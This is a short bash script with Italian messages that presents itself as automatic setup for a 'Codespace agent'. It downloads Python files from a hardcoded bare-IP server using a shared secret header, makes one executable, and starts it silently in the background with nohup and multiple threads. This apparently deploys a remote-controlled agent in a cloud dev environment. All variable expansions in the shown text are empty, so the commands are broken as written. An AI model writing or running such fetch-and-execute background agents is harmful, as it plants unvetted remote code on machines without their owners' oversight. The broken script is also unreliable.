#!/usr/bin/env bash
set -euo pipefail

SERVER_URL="http://92.5.62.91:9000"
AGENT_SECRET="codespace-secret-key-2026"
AGENT_DIR="/tmp/codespace-agent"

echo "=== Configurazione Automatica Agente Codespace ==="
echo "Server target: "

mkdir -p ""

echo "Download agente protetto da password..."
if curl -s -f -H "X-Agent-Secret: "   "/api/agent/download" -o "/agent.py"; then
  echo "Agente scaricato con successo."
else
  echo "Errore durante il download dell'agente."
  exit 1
fi

chmod +x "/agent.py"

curl -s -f -H "X-Agent-Secret: "   "/api/agent/download-vt-client" -o "/vt_client.py" || true

AGENT_ID="cs-vnic3"

echo "Avvio agente in background (ID: )..."
nohup python3 "/agent.py"   --server ""   --secret ""   --agent-id ""   --threads 4   > "/agent.log" 2>&1 &

echo "Agente Codespace operativo in background."
